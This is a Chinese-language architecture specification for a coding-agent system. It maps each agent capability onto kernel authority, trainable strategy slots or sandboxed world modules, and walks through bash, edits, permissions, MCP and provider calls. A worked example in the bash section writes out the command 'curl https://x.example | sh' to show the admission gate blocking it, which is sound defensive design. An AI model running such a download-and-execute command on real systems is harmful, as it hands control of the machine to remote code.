# 7. 通用编码 Agent 能力映射 (Capability Mapping)

前面的章节定义了 Core Code 的三层结构:一个固定的微内核 (microkernel / TCB)、一组稳定的类型化 ABI 契约 (five typed contracts)、以及一组可演化的策略槽 (StrategySlot) 与其背后的世界模块 (world modules)。本节回答一个具体而高频的定位问题:一个成熟的、生产级终端编码 Agent 所具备的每一项能力,在这个系统里究竟落在哪儿,是内核的职责,还是某个策略槽,抑或是效果代理 (effect broker) 之后的一个世界模块。这个问题之所以必须被系统性回答,是因为它决定了每一项功能的归属边界:归属错了,要么把可演化的策略冻进 TCB,要么把不可协商的权威泄漏给可训练的策略。

本节是全文的翻译表:它把工程师熟悉的一份能力清单(读/改/写/patch/搜索/git,进程/PTY,权限/沙箱,会话/恢复/检查点,MCP,hooks,skills,commands,TUI,Provider 流式/鉴权,可观测性)逐项映射到 Core Code 的三个安置类别之一(或其组合)。这既是给外部读者的心智模型,也是一条规范约束 (normative constraint):任何新能力进入本系统时,MUST 依照本节的判定规则被安置,而不得把 Provider 调用、prompt 构造、上下文选择、进程派生、MCP 解析或 UI 渲染塞进内核以图省事。本节所用的类别、契约与不变量在 §7.1 给出精确定义;逐能力结论见 §7.2;端到端走查见 §7.3;接口稳定性的论证见 §7.4;新能力的落地规程见 §7.5;成熟形态与早期切片的范围界线见 §7.6。

> 诚实声明 (status honesty). Core Code 目前处于 pre-alpha:它是一个可运行但仍是模块化单体 (modular monolith) 的实现。内核当前硬依赖约 10 个具体 crate,运行主循环仍是一个命令式的大函数而非纯 reducer,单一效果代理目前只覆盖 registry 工具。因此本节描述的是目标边界 (the target boundary),即微内核抽取 (M1) 完成后每项能力 MUST 落位的地方;它同时也是判定某个功能是否被正确安置的验收标尺。凡本节出现的能力落位,均以此目标语义陈述,不代表当前代码已全部就位。任何读者在对照当前实现时,MUST 以本节的目标边界为验收基准,而不得以模块化单体的现状反推架构意图。

### 7.1 三个安置类别与一个前端平面

每一项编码 Agent 能力,MUST 被分解为最多三个正交的部分,分别落入不同的类别。这是本节全部映射的骨架。

| 类别 | 它是什么 | 谁拥有它 | 演化性 |
|---|---|---|---|
| **A. 微内核职责 (kernel duty)** | 权威 (authority) 与不变量 (invariant):谁被允许做什么、如何被记录、如何被边界化、如何被回滚 | 固定 TCB | 不可演化。安全不能是自改进算子的不动点。 |
| **B. 策略槽 (StrategySlot)** | 策略 (policy):在允许的空间内选择做什么、怎么做、用什么参数,按 vertical 训练/调优 | `evolve::StrategySlot`(9 个核心槽 + vertical 扩展槽 + 一个 code-valued 逃生舱槽) | 可训练/可演化,以 PolicyManifest 为一等制品 |
| **C. 世界模块 (world module,在 effect broker 之后)** | 机制 (mechanism):真正对外部世界施加效果的代码,读文件、派生进程、发 HTTP、连 MCP server | Plane-2 模块,经效果代理调度、经能力准入 (capability admission) 授权 | 机制可替换/可硬化,但始终在代理之后、受准入约束 |

上表的三类是互斥且穷尽的:任何一段代码要么裁决权威(A),要么在允许空间内选择(B),要么施加一次真实效果(C)。一段代码若同时声称承担两类职责,MUST 被拆分,否则它就成了一个跨越审计边界的旁路。此外还有一个不属于上述三类、但每次都要显式指出的第四位置:

- **D. 产品平面客户端 (product-plane client / frontend).** TUI、CLI、以及未来的 IDE/headless 客户端,是 App Server 的纯客户端:它们提交 `TaskEnvelope`(以 `Op` 形态)、渲染 Event 流。内核 MUST NOT 渲染 UI(这是内核的负空间 negative space)。TUI 因此既不是内核职责,也不是策略槽,也不是世界模块:它是运行时之外的一个客户端。把它单列出来,是为了防止一个常见误置,即让前端持有并驱动一个具体 Agent。一旦前端持有 Agent 循环,权威(准入判决)、策略(工具选择)与机制(效果执行)就会在客户端进程里被重新混合,§7.4 所依赖的星形拓扑随之瓦解。

判定规则 (the placement discriminator). 面对任意一项能力 X,依次问三个问题:

1. **X 是否决定"谁被允许做什么 / 效果如何被审计与回滚 / 边界如何不被逾越"?** 若是,X 的这一部分是 **A. 内核职责**,MUST 进入 TCB,且 MUST NOT 被任何训练方法改写。
2. **X 是否决定"在允许的空间里选哪条路、用什么参数、按什么顺序"?** 若是,X 的这一部分是 **B. 策略**,MUST 落入某个 StrategySlot,以 typed policy 表达,其训练态即 PolicyManifest 的一个 slot 条目。
3. **X 是否真正对外部世界施加一次效果(触碰文件系统/进程/网络/终端)?** 若是,X 的这一部分是 **C. 世界模块**,MUST 位于效果代理之后,并以一次被准入的 `EffectProposal` 触发。

绝大多数能力会同时落在 A、B、C 三处,这正是本节要讲清楚的核心。一个能力被正确安置,不是把它整块塞进某一格,而是把它的权威、策略、机制三个面切开,各归其位。worked example(判定器的一次应用):对能力 X = "跑一次单元测试",问题 1 的答案是内核拥有该进程效果的准入与回滚(A),问题 2 的答案是由 `tool_policy` 选择测试命令与超时预算(B),问题 3 的答案是由进程执行世界模块真正 fork/exec(C);三个答案非空,故 X 是一个典型的三面能力,而非单格能力。

### 7.2 主映射表 (the master map)

下表把生产级编码 Agent 的能力清单逐项拆成 权威 (A) / 策略 (B) / 机制 (C),并给出跨越 ABI 边界所用的契约。ABI 五契约为:`TaskEnvelope`(一个工作单元的提交)、`ContextRequest`(策略向世界索取上下文)、`ToolIntent`(策略提出的一次工具调用意图)、`EffectProposal`(被准入后交给代理执行的一次效果)、`ArtifactRef`(内容寻址的结果引用)。为便于对照落位,这五个契约的规范字形至少包含以下字段(类型为说明性,权威定义见 §3):

- `TaskEnvelope { task_id, op, workspace_root, parent_record_ref?, budget{tokens, wall_ms, usd?}, trust_context }`;
- `ContextRequest { request_id, kind: read | glob | search | skill_index | mcp_resource, selectors[], depth, byte_ceiling }`;
- `ToolIntent { intent_id, tool: string, args: map, path?: string, proposed_tier?: CapabilityTier }`;
- `EffectProposal { proposal_id, effect_kind: fs_read | fs_write | process_spawn | http | pty, admitted_tier: CapabilityTier, capability_handle, deadline_ms, cancel_token }`;
- `ArtifactRef { content_hash: sha256, media_type, size_bytes, origin_taint: Trusted | Untrusted }`。

其中 `CapabilityTier` 是一个五值全序枚举:`ReadOnly < ReversibleLocal < CodeExecuting < TrustMutating < IrreversibleExternal`;准入判决 (admission decision) 是 `Auto | Ask | Deny` 三值;origin taint 是 `Trusted | Untrusted` 二值。

| 能力 (capability) | A. 内核职责 (authority / invariant) | B. 策略槽 (StrategySlot) | C. 世界模块 (behind broker) | 主要 ABI 契约 |
|---|---|---|---|---|
| **read / list / glob** | 能力准入判为 ReadOnly;工作区符号链接围栏;Observable 记录 | `context`(读什么、读多深)、`tool_policy`(选哪个读工具) | 文件系统读模块 | `ContextRequest` -> `ArtifactRef` |
| **grep / search** | ReadOnly 准入;每文件字节上限属边界纪律 | `tool_policy`(substring vs ripgrep-class、深度、ignore 规则) | 搜索引擎模块 | `ToolIntent` -> `ArtifactRef` |
| **edit** | 准入判 ReversibleLocal;路径敏感升级到 TrustMutating(`.git/`、CI、指令文件);检查点 (checkpoint) 快照以保证 Recoverable | `tool_policy`(exact-anchor vs 模糊落地阶梯 vs V4A/patch 语法) | 文件系统写模块(原子写、EOL/BOM 保真) | `ToolIntent` -> 准入 -> `EffectProposal` -> `ArtifactRef` |
| **write / create** | 准入(携带 `path` 者自动按 ReversibleLocal/TrustMutating 定级);检查点 | `tool_policy`(何时新建、如何分块多文件) | 文件系统写模块 | `ToolIntent` -> `EffectProposal` |
| **multi-file patch** | 单一效果代理保证全有或全无、跨 crash 窗口不被半提交;检查点 | `tool_policy`(patch 语法、hunk 排序、模糊 seek) | patch 应用模块 | `ToolIntent` -> `EffectProposal` |
| **git(status/diff/commit/worktree)** | 准入(diff=ReadOnly;commit/branch=CodeExecuting/TrustMutating);进程效果经代理并受沙箱围栏 | `tool_policy`(用哪个 git 子命令);`collaboration`(隔离 writer worktree) | VCS/进程模块(与 bash 同一条受限执行路径) | `ToolIntent` -> `EffectProposal` |
| **process / bash / PTY** | 效果代理 + 能力准入(判 CodeExecuting、经 trust taint 决定 egress);预算/截止/取消(deadline + cancel token);kill/rollback | `tool_policy`(选 bash 还是专用工具、args、前台/后台、超时预算、命令内容安全分类) | 受沙箱进程执行模块(PTY 分配、流式、背压、进程组回收、OS 沙箱后端) | `ToolIntent` -> `EffectProposal` |
| **permissions(权限判定)** | 就是内核本体:5 档能力格 (lattice)、纯 deny-by-default gate、intersection-only、不可协商的 carve-out、身份与信任 | 无(gate 不可演化);何时提问的 mode/交互策略可部分落 `tool_policy`,但 gate 判决权 MUST 留在内核 | 无 | 贯穿全部 `EffectProposal` 的准入判决 |
| **sandbox(沙箱机制)** | 内核决定某工具得到哪一档能力;沙箱是否可用的 deny-by-default 由内核裁决 | 无(机制不承载策略) | OS 沙箱后端模块(Seatbelt/bubblewrap/未来 Windows;网络 egress 代理) | `EffectProposal` 携带 capability-scoped 句柄 |
| **sessions / resume** | 规范记录/回放 (canonical record/replay):SHA-256 哈希链、防篡改、crash 可对账;有界 driver;恢复即对记录做回放 | `memory`(带什么进下一段)、`context`(压缩、@-import 合并) | 记录持久化 I/O 模块 | `TaskEnvelope`(resume 指向记录) |
| **checkpoint / rewind** | 检查点是内核职责(Recoverable 不变量);kill/rollback | `memory`(何时打点) | 工作区文件快照模块 | 记录中的 checkpoint 事件 |
| **MCP** | 效果代理 + 能力准入(每个 MCP 工具按其档位准入);身份与信任(MCP server=Untrusted origin taint);版本注册表 | `tool_policy`(选哪个 MCP 工具);`context`(消费 MCP resources/prompts) | MCP 客户端模块(传输、framing、server 进程派生+回收)。内核 MUST NOT 解析 MCP | `ToolIntent` -> `EffectProposal` -> `ArtifactRef` |
| **hooks** | 效果代理(hook 命令派生必须过代理);准入;trust-by-origin(仅 operator 配置可注册)。hook 只能收紧 (deny),intersection-only 决定它不能授予能力 | 无(hooks 是 operator 扩展点,不是被训练的策略) | hook 执行模块(进程派生、有界捕获、回收) | hook 判决反馈进准入,`EffectProposal` |
| **skills** | trust-by-origin taint(vendored=Untrusted 剥权);`use_skill` 为 Pure/ReadOnly 工具正常准入 | `context`(渐进式披露:注入哪些 skill 索引)、`planner`(何时调用) | skill 发现=文件系统读模块 | `ContextRequest` -> `ArtifactRef` |
| **commands(自定义 slash 命令)** | 无(命令展开是前端/产品平面职责);展开结果作为 `TaskEnvelope` 输入被内核接纳 | `router`/`planner`(消费命令模板)、`context`(参数模板 `$ARGUMENTS`) | 命令发现=文件系统读模块 | 展开为 `TaskEnvelope` |
| **TUI / CLI / IDE 客户端** | 内核负空间:内核 MUST NOT 渲染 UI | 无 | 无(它是 **D. 产品平面客户端**) | 提交 `Op`/`TaskEnvelope`,渲染 Event 流 |
| **Provider 流式 (streaming)** | 效果代理调度 Provider HTTP 效果;预算/截止/取消(cancel token 注入流);版本注册表。内核 MUST NOT 调 Provider、MUST NOT 构造 prompt | `model_router`(选模型/effort/failover 链);`context`(构造 prompt、放置 cache breakpoint) | Provider 适配器模块(SSE 解析、重试、HTTP/TLS) | `EffectProposal` -> `ArtifactRef`(流式) |
| **Provider 鉴权 (auth)** | 身份与信任(凭据处理);准入;记录密文脱敏是 Observable + Security-bounded 不变量 | `model_router`(选路由) | 凭据/鉴权模块(OAuth/device-code/API-key/云 IAM) | `EffectProposal`(凭据即效果) |
| **observability / telemetry / cost** | 规范记录即真相源(防篡改日志);Observable 是内核性质;预算账本 (ledger);dollar 成本经 route-bound rate card 实现 | `model_router`(rate card 绑定路由) | 遥测导出模块(OTEL exporter,网络/文件效果经代理) | 从记录派生;导出走 `EffectProposal` |

读表约定:表中同一能力的 A、B、C 三列并非可选其一,而是同一能力被切开后各自的去向;"无"表示该能力在该类别上没有职责,而非"未定"。契约列中的 `->` 表示一次跨 ABI 边界的数据流向,方向即真实调用序。

### 7.3 逐能力走查 (worked walk-throughs)

主映射表给出结论;下面对最容易被误置、也最能说明系统语言的能力做端到端走查。每一例都追踪同一条数据流:策略提出 `ToolIntent` -> 内核能力准入判决 -> 内核发出 `EffectProposal` 给代理 -> 世界模块执行 -> `ArtifactRef` 回传 -> 内核记入规范记录 -> 纯 reducer 折进状态。这条数据流本身是不变量:任何能力若绕过其中任一环(尤其是绕过准入或绕过记录),即为安置错误。

#### 7.3.1 bash / 进程执行 (R1:bash 不在内核里)

这是最需要被讲清的一例,因为它最能暴露"bash 到底算不算内核逻辑"这一安置判断。结论:bash 的三个面被切开,分属三类,没有任何一面是内核里的逻辑。

- **A. 权威(内核).** 内核拥有两样、且只有两样与 bash 相关的东西:(1) 效果代理,bash 派生进程这一效果 MUST 作为一次 `EffectProposal` 穿过唯一的审计边界;(2) 能力准入,bash 被定级为 CodeExecuting 档,其网络 egress 由 trust taint 裁决(governing context 非 Trusted 则 egress 被阻断,且审批不能静默清除污点)。此外内核以其预算/截止/取消职责为这次执行注入一个 deadline 与 cancel token,以其 kill/rollback 职责保证超时后整组进程被回收。内核不解析 bash 命令、不决定要不要跑 bash、不知道 PTY 为何物。
- **B. 策略(`tool_policy` 槽).** "这一步该用 bash 还是某个结构化工具、命令行怎么拼、前台还是后台跑、申请多长的超时预算、这条命令是只读的 `ls` 还是危险的 `curl | sh`",全部是 `tool_policy` 槽的策略输出,按 vertical 训练。命令内容安全分类 (command-content classification) 是策略产物,它喂给准入以细化档位,但它本身不是内核:一个训练更好的分类器会让危险命令更准地升档,但它永远只能建议收紧,不能授予能力。
- **C. 机制(世界模块).** 真正 openpty、流式输出、背压、进程组 SIGTERM 到 SIGKILL 的升级回收、以及 OS 沙箱后端 (Seatbelt/bubblewrap/未来 Windows),全部位于 Plane-2 的进程执行世界模块里,在代理之后运行,只拿到一个 capability-scoped 的执行句柄。

worked example(一次危险命令的完整判决):`tool_policy` 产出 `ToolIntent{tool:"bash", args:{cmd:"curl https://x.example | sh"}, proposed_tier:CodeExecuting}`,并附上命令内容分类结果"含网络下载后直接执行"。内核准入读取 governing trust_context:若为 Untrusted,egress 被 deny-by-default 阻断,该 intent 被降级为无网络的 CodeExecuting 或直接 `Deny`,判决 `Auto|Ask|Deny` 写入记录且对模型不可见;若为 Trusted 且当前 mode 要求确认,则判 `Ask`。准入通过后内核发 `EffectProposal{effect_kind:process_spawn, admitted_tier:CodeExecuting, deadline_ms:120000, cancel_token}`,世界模块在沙箱后端内执行。failure mode:进程逾越 deadline,则内核凭 cancel token 触发进程组回收(先 SIGTERM,宽限后 SIGKILL),部分输出仍以 `ArtifactRef` 回传并标注截断,状态经 reducer 折入,记录完整可对账。

一句话:bash 是一个工具,它的效果被内核中介与准入,但 bash 不是内核里的逻辑。这条判定固化为 owner decision R1:内核拥有的是对包括 bash 在内的任何工具能做什么的权威,而不是 bash 本身。任何把 bash 命令解析、命令构造或 PTY 管理写进 TCB 的做法,MUST 被视为对 R1 的违反。

#### 7.3.2 文件编辑 edit / write / patch

一次编辑 `foo.rs` 的调用如此流动:`tool_policy` 槽选择落地策略(exact-anchor 还是模糊阶梯还是 V4A patch 语法)并发出一个 `ToolIntent{tool:"edit", path:"foo.rs", args:{old, new}}`。内核的能力准入将其判为 ReversibleLocal;若 `path` 命中 `.git/`、CI 配置或指令文件(`CLAUDE.md`/`AGENTS.md`),则路径敏感升级到 TrustMutating(此档在任何 mode 下,包括 Yolo,都 MUST NOT 自动放行)。准入通过后,内核在写入之前以其检查点职责对该文件做一次工作区快照(保证 Recoverable),再发出 `EffectProposal{effect_kind:fs_write}` 交代理执行;文件系统写模块完成原子写与 EOL/BOM 保真,回传 `ArtifactRef`(内容寻址的 diff,`content_hash` 为 sha256)。整个过程记入哈希链记录。这里唯一"聪明"的部分(怎么把模型给的搜索文本落到真实字节上)是 `tool_policy` 的可训练策略;唯一"权威"的部分(这次写允许吗、能回滚吗)是内核。

边界情形与失败模式:

- 目标路径为 `.git/hooks/pre-commit`:命中敏感路径围栏,自动升级到 TrustMutating,即便 mode=Yolo 也 MUST 判 `Ask` 或 `Deny`,理由是一次编辑可植入后续每次 commit 都执行的代码,权威面高于一次普通本地写。
- old-anchor 在文件中匹配 0 次或多于 1 次:世界模块 MUST NOT 猜测落点,应将该 `EffectProposal` 以失败 `ArtifactRef` 回传,由 reducer 记录并交回策略重试;检查点因发生在写入之前,此时无需回滚。
- 写入中途 crash:因单一效果代理保证全有或全无,重启后按记录对账,未提交的半写被检查点快照覆盖回滚,Recoverable 不变量成立。

multi-file patch 是同一模式的批量化:单一效果代理保证一组 hunk 跨 crash 窗口不被半提交,`tool_policy` 负责 patch 语法与 hunk 排序,patch 应用模块负责真正落字节。此三面切分与 §7.3.1 的 bash 完全同构。

#### 7.3.3 权限与沙箱(必须切开的一对)

权限 (permissions) 与沙箱 (sandbox) 常被混为一谈,但在本系统里它们分属 A 与 C:

- **权限判定就是内核本体.** 5 档能力格 `ReadOnly < ReversibleLocal < CodeExecuting < TrustMutating < IrreversibleExternal`、纯函数 deny-by-default gate、intersection-only(准入只做交集,"never union")、不可协商的 carve-out,这些是固定 TCB,MUST NOT 被任何训练方法改写。一个候选策略可以提议一次调用,但不能授予能力、不能改写证据、不能放松预算、不能伪造 held-out 结果、不能自我晋升。
- **沙箱是机制,是世界模块.** Seatbelt SBPL、bubblewrap namespace、网络 egress 代理,是 C 类世界模块:它们执行内核判给某工具的那一档能力,但不裁决该给哪一档。沙箱后端可以硬化、可以增加 Windows 后端,而不触动权限的类型化 ABI。

把"何时向用户提问"的交互策略(mode 选择)部分下放到 `tool_policy` 是允许的 (MAY);但 gate 的判决权(某次 `EffectProposal` 是 `Auto`/`Ask`/`Deny`)MUST 留在内核,且其结果对模型不可见、不可影响。intersection-only 的精确含义是:一次调用的实得能力恒等于 slot 上限与父级上限的交集,任何一方的收紧都会传导为整体收紧,而任何一方都无法把对方没有的能力"并"进来。failure mode:若某实现让沙箱后端"顺手"放宽了内核已 deny 的 egress,即为把机制冒充成了权威,MUST 被判为安置错误。

#### 7.3.4 MCP

MCP 的映射清晰地展示了负空间纪律。内核 MUST NOT 解析 MCP:协议 framing、传输选择 (stdio/SSE/streamable-HTTP)、server 进程的派生与回收,全部在一个 C 类 MCP 客户端世界模块里,在代理之后运行。选哪个 MCP 工具是 `tool_policy` 的策略;消费 MCP 暴露的 resources/prompts 是 `context` 的策略。而每一次 MCP 工具调用,作为一次外部效果,MUST 作为 `EffectProposal` 穿过效果代理并被按其能力档位准入;MCP server 作为外部来源,其返回内容被打上 Untrusted origin taint,由身份与信任这一内核职责统一处理。协议版本协商由内核的版本注册表职责登记。worked example:一个 MCP 文件系统工具返回的路径若被后续 edit 使用,该 `ArtifactRef.origin_taint=Untrusted` 会沿数据流传播,使基于它派生的任何 CodeExecuting 效果自动落入更严的 egress 裁决,防止 Untrusted 内容悄悄提权。

#### 7.3.5 hooks / skills / commands(可扩展面)

这三者常被一并称作可扩展性,但它们落位不同:

- **hooks** 是 operator 授权的扩展点,不是被训练的策略槽。其执行(进程派生、有界捕获、回收)是一个 C 类世界模块,经代理。关键约束:一个 hook 的判决只能收紧(它可以 deny 一次工具调用),而永远不能授予能力,这正是 intersection-only 不变量在扩展面的体现。因此 hooks 增强的是 Security-bounded,而非漏洞。failure mode:一个 hook 试图把某次调用从 `Deny` 翻为 `Auto`,该翻转 MUST 被内核忽略,因为交集运算不接受任何一方单向放宽。
- **skills** 的机制(从磁盘发现 SKILL.md)是 C 类文件读模块;但选择注入哪些 skill、何时调用是 `context`(渐进式披露)与 `planner` 的策略。vendored skill 被打 Untrusted taint 并剥权,由内核身份职责处理。
- **commands(自定义 slash 命令)** 根本不进内核:它们是前端/产品平面的宏,展开后作为一个 `TaskEnvelope` 提交给运行时;参数模板 (`$ARGUMENTS`) 是 `context` 的策略。命令发现同样是 C 类文件读模块。

#### 7.3.6 Provider 流式与鉴权

模型调用最能说明"权重学先验、harness 学情境"的分工。内核 MUST NOT 调 Provider,也 MUST NOT 构造 prompt。prompt 的构造、上下文选择、cache breakpoint 放置是 `context` 槽的策略;选哪个模型、什么 effort、失败后的 failover 链是 `model_router` 槽的策略;两者的训练态都写进 PolicyManifest。真正发 HTTP、解析 SSE、执行重试的是一个 C 类 Provider 适配器世界模块,经代理调度。内核在此只做四件其固定职责内的事:以效果代理调度这次网络效果、以预算/截止/取消职责注入 cancel token(使中途取消能在确定的安全边界中止而不提交半截输出)、以版本注册表登记 Provider 契约版本、以记录脱敏不变量保证凭据与 chain-of-thought 在防篡改日志里被 `[OPAQUE]` 化。鉴权流(OAuth/device-code/API-key/云 IAM)是一个 C 类凭据模块;选路由是 `model_router`;而"绝不伪造 $0 成本、无 rate card 时诚实报 Unknown"是内核账本职责的一部分。

worked example(一次 failover):`model_router` 给出链 `[A, B]`;对 A 的 `EffectProposal` 因 HTTP 5xx 由适配器重试耗尽后回传失败 `ArtifactRef`,reducer 折入,`model_router` 据记录切到 B。整个切换是策略在既有 slot 空间内的重参数化,内核接口一字未动;预算账本按 route-bound rate card 分别记账,若 B 无 rate card,成本字段 MUST 记为 `Unknown` 而非 0。

#### 7.3.7 会话、恢复与可观测性

会话持久化、resume、checkpoint 是内核的规范记录/回放职责:一条 SHA-256 哈希链、防篡改、crash 可对账的记录,是系统唯一真相源;resume 即对该记录做确定性回放;checkpoint/rewind 是 Recoverable 不变量的实现(文件快照机制本身是 C 类模块)。可观测性同理:遥测的证据(记录、账本、成本)是内核所有,而 OTEL exporter 这一导出动作是一次网络/文件效果,MUST 作为 C 类世界模块经代理;这样可观测就不是事后加的日志,而是内核记录的直接投影。至于下一段带什么进来、如何压缩、如何合并 @-import 的层级指令,则是 `memory` 与 `context` 槽的可训练策略。worked example(crash 对账):进程在第 N 条效果后崩溃,重启时 driver 从哈希链最后一个已确认锚点回放到 N,校验每条记录的 `content_hash` 链;任何断链即判损坏并停机而非静默续跑,这是有界 driver 的安全默认。

### 7.4 微内核接口在演化中是否改变?

不改变。这正是整套定位成立的前提。本节的全部映射之所以能作为一份稳定的翻译表,是因为两组东西被冻结为固定点:

1. **五个 ABI 契约**:`TaskEnvelope` / `ContextRequest` / `ToolIntent` / `EffectProposal` / `ArtifactRef`;
2. **九项内核职责**:身份与信任、能力准入(5 档格,intersection-only,capability-monotone)、单一效果代理、确定性状态归约(纯 reducer)、规范记录/检查点/回放、预算/截止/取消、版本注册表、kill/rollback、有界 agent-loop driver。

演化流水线(trajectory -> 受治理数据集 -> 候选生产者 -> PolicyManifest -> 准入 -> 独立 held-out 评估 -> shadow -> canary -> active,带确定性回滚)只做一件事:在既有 StrategySlot 空间内重新参数化策略。一个 PolicyManifest 是在 slot ABI 之上的数据,方法无关(search/GEPA、SFT、preference、GRPO、RL 产出的都是同一种制品),可 diff/merge/restrict/retire/transfer。它不能、也无处新增一个内核接口:

- 演化 MUST NOT 改变五契约的类型;新能力若需要新的携带信息,MUST 走 vertical-pack 扩展槽(见 §7.5),而非修改 TCB。
- 候选的 capability authority 恒等于 `subset(slot-ceiling INTERSECT exact-parent-ceiling)`,intersection-only,"never union",所以任何训练产物都不能扩张 gate 的判决空间。
- 因此,微内核接口在演化中是否改变的答案是明确的否:权重学到的是先验,harness 学到的是情境;情境的沉淀全部发生在 slot 参数上,而 slot 通过永不改变的五契约与内核对话。这就是"计算是一次性的;架构 (harness) 与上下文 (context) 才是会沉淀、增值的资产"在接口层面的精确含义。

模块互操作与可扩展性如何被保证 (module interoperability/extensibility). 模块之间从不直接相互调用;它们只通过内核、以五契约通信。`context` 槽不认识 `tool_policy` 槽,它们各自向内核发 `ContextRequest` / `ToolIntent`,由内核准入并经代理落地为 `EffectProposal`,结果以 `ArtifactRef` 回流。这种星形、经内核中介的拓扑,使得任一模块可被独立替换或训练而不惊动其余模块:可扩展性不是靠约定俗成,而是靠"所有跨模块信息 MUST 且只能以五契约表达"这条硬规则被机器可检查地保证。一个可验证的推论是:任意两个 slot 的替换互不产生编译期或运行期耦合,因为它们之间不存在直接类型依赖,唯一的公共依赖是永不改变的五契约。

### 7.5 新能力如何落地而不触动内核(逃生舱与 vertical 扩展)

`evolve::StrategySlot` 是一个开放的、命名空间字符串类型 (open namespaced-string type),而非封闭枚举。可扩展性由这个开放命名空间在类型层面直接保证:九个核心槽(router、planner、context、memory、scheduler、tool_policy、verifier、model_router、collaboration)之外,一个 vertical pack MAY 追加自己的槽,例如数据库 vertical 的 `db/query_planner`、客服 vertical 的 `support/escalation_router`,无需改动微内核。新槽同样只通过五契约与内核对话,同样受能力准入约束,同样以 PolicyManifest 条目承载其训练态。命名空间冲突由前缀约定避免:核心槽占无前缀名,vertical 槽 MUST 带 `<vertical>/` 前缀,故任意第三方 pack 的新增槽名 MUST NOT 与核心槽或彼此碰撞。

对于那些形态尚未收敛、需要自由探索的策略,系统提供一个 code-valued 逃生舱槽 (escape-hatch slot),带一条已定义的 blob -> typed 晋升路径:ADAS 式自由形式发现产出的候选,先以 code-blob 形态进入逃生舱,经独立评估与准入后被编译进类型化 slot 空间。这保证了"能自由发明新策略"与"新策略最终仍受同一套 typed ABI + 准入约束"两者兼得:自由探索被收敛回可治理的空间,而不是在内核上开洞。逃生舱内的 code-blob 在晋升前 MUST 被视为 Untrusted 并在最严档位下评估,其网络与写效果照常经代理与准入,故一段未成熟的探索代码无法凭借"还在逃生舱里"取得任何越过 gate 的能力。

因此,对于任何本节尚未列出的生产 Agent 特性,其落地方法 MUST 是:把它切成 A/B/C 三面,权威面(若有)落到既有内核职责(通常无需新增,因为准入/代理/记录已是通用的),策略面落到某个核心槽或一个新的 vertical 扩展槽,机制面作为一个新的世界模块置于代理之后。新增能力 SHOULD NOT 触及 TCB;若某能力看似必须改内核接口才能实现,这几乎总是一个安置错误的信号:它的权威面被误当成了机制面。诊断规程:重跑 §7.1 的三问判定器,把被认为"必须进内核"的部分逐句归类,若它其实只是"选择或执行"而非"裁决权威",则它属于 B 或 C,内核接口无需改动。

### 7.6 成熟形态是前瞻性定位,不是任何早期切片的范围

本节的映射描述的是 Core Code 的完整语言,其成熟形态在覆盖度上将与业界成熟终端 Agent 同量级,因为(如本规范他处所述)成熟 Agent 的体量差距主要来自广度、硬化与测试的乘积,而非架构本身。本节所列的每一项能力,在成熟形态里都会成为一个完整子系统。

但这一成熟形态是前瞻性的定位,MUST NOT 被用来描述任何早期演示切片的范围。一个早期演示是一条薄的垂直切片:在单一 vertical、单一冻结基座模型上,点亮本节映射中的一条端到端路径(例如:少数几个策略槽被训练、其余取默认;世界模块只需最小可用的读/写/执行;内核职责取当前已实现的子集),而不需要把每一格都填满。这条界线与 §7.1 的诚实声明互为表里:目标边界规定每项能力最终 MUST 落位的格子,早期切片规定当前只点亮其中一条路径,二者不得互相冒充。本节的价值在于给出目标边界,好让任何新增的东西都落入正确的格子,而不是让成熟形态的覆盖度倒过来定义一条切片的范围。owner decision R2 由此成立:成熟形态与早期切片是两个不同的承诺层,评审一份早期切片 MUST 以其自身声明的路径为范围,而非以本节的完整语言为达标线。